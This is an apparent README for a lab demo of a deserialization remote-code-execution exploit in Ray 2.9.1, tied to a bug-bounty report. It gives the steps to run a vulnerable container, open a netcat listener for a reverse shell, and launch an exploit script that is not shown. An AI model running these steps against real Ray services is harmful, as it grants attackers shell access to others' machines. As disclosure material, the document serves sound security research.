# Ray 2.9.1 Deserialization Demo - CWE-502
Report: https://huntr.com/bounties/ce6cb61c-fce1-406f-80e2-f3b7cdddbd6f
Resources:
   - https://docs.ray.io/en/latest/ray-overview/installation.html
   - https://github.com/ray-project/ray


## Overview
### Description
This is an RCE exploit for Ray 2.9.1. The exploit is a deserialization attack that allows an attacker to execute arbitrary code on the target machine. The attack is performed by sending a malicious serialized object to the Ray service. The service deserializes the object and executes the code contained within it.

### Rating
The vulnerability has been rated as `Critical` with a CVSS score of `9.8`. This is because the vulnerability is remotely exploitable and allows an attacker to execute arbitrary code on the target machine.


## Commands
### Terminal 1 - Start the Service
```bash
docker pull rayproject/ray:2.9.1
docker run -it -p 10001:10001 -p 10002:10002 -p 10003:10003 -p 10004:10004 --shm-size=4.43gb rayproject/ray:2.9.1
```

From the container run:
```bash
ray start --head
```

### Terminal 2 - `netcat` Listener
```bash
nc -lvp 4321
```

### Terminal 3 - Attack
```bash
python -m venv .venv-3.8
source .venv/bin/activate
pip install -r requirements.txt
python exploit.py
```
